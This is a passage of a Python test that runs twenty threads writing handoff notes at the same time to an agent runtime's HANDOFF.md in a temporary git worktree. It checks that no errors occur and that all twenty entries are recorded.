    repo = tmp_path / "repo"
    state = tmp_path / "state"
    _init_git_repo(repo)

    runtime = DurableRuntime(state_dir=state, repo_path=repo, state_namespace="stress", agent_name="codex")
    binding = runtime.ensure_binding("channel-stress")
    handoff_path = binding.worktree_path / "memory" / "HANDOFF.md"

    errors: list[BaseException] = []
    lock = threading.Lock()
    barrier = threading.Barrier(20)

    def worker(idx: int) -> None:
        barrier.wait()
        try:
            runtime.write_handoff(
                binding,
                task_id=f"task-{idx}",
                changed_files=[],
                commands_run=[],
                result=f"result-{idx}",
                blocker="",
                next_step=f"continue-{idx}",
            )
        except BaseException as exc:  # noqa: BLE001
            with lock:
                errors.append(exc)

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(20)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert errors == []
    handoff_text = handoff_path.read_text(encoding="utf-8")
    assert handoff_text.count("## ") == 20
